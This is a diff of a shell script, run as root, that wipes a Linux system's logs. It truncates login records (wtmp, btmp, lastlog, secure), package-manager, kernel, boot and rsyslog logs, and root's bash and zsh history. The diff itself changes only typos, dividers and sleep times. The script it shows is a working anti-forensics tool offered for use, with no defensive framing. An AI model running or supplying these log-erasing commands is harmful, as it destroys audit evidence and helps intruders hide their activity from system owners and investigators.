@@ -12,15 +12,15 @@ echo "#                              #"
 echo "################################"
 echo "# # # # # # # # # # # # # # # #"
 echo "!!!Please enter ROOT to work!!!"
-echo "tart after 10 seconds" && sleep 10s
-#---------------------------------------#
+echo "Start after 10 seconds" && sleep 10s
+echo "--------------------------------------------"
 echo "Clearing login information ..."
 wtmp='/var/log/wtmp'
 btmp='/var/log/btmp'
 lastlog='/var/log/lastlog'
 secure='/var/log/secure'
 
-sleep 1s
+sleep 3s
 
 if [ -e $wtmp ] ; then
    cat /dev/null > $wtmp 2>/dev/null && echo 'The [wtmp] is clear'
@@ -53,8 +53,7 @@ if [ -e $secure ] ; then
 fi
 
 sleep 1s
-
-#---------------------------------------#
+echo "--------------------------------------------"
 echo "Clearing used information ..."
 dpkglog='/var/log/dpkg.log'
 faillog='/var/log/faillog'
@@ -66,7 +65,7 @@ pacmanlog='/var/log/pacman.log'
 yumlog='/var/log/yum.log'
 
 
-sleep 1s
+sleep 3s
 
 if [ -e $dpkglog ] ; then
    cat /dev/null > $dpkglog 2>/dev/null && echo 'The [dpkglog] is clear'
@@ -132,7 +131,7 @@ fi
 
 sleep 1s
 
-#---------------------------------------#
+echo "--------------------------------------------"
 echo "Please wait for the program to complete ..."
 termlog='/var/log/apt/term.log'
 bootlog='/var/log/boot.log'
@@ -148,7 +147,7 @@ kernlog='/var/log/kern.log'
 userlog='/var/log/user.log'
 rsyslog='/var/spool/rsyslog/*'
 
-sleep 1s
+sleep 3s
 
 if [ -e $termlog ] ; then
    cat /dev/null > $termlog 2>/dev/null && echo 'The [termlog] is clear'
@@ -254,10 +253,11 @@ fi
 
 sleep 1s
 
-#---------------------------------------#
+
+echo "--------------------------------------------"
 echo "Please wait for clear SHELL to complete ..."
 
-sleep 1s
+sleep 3s
 
 if [ -e /root/.bash_history ] ; then
    cat /dev/null > /root/.bash_history 2>/dev/null && echo 'The [bash-history] is clear'
@@ -270,7 +270,7 @@ if [ -e /root/.zsh_history ] ; then
 fi
 
 sleep 1s
-
+echo "--------------------------------------------"
 echo "It's done !! HOPE YOUR ENJOY !!"
 
 # a=`[ -e /etc/pacman.d/mirrorlist ] && echo 'The file exist'`
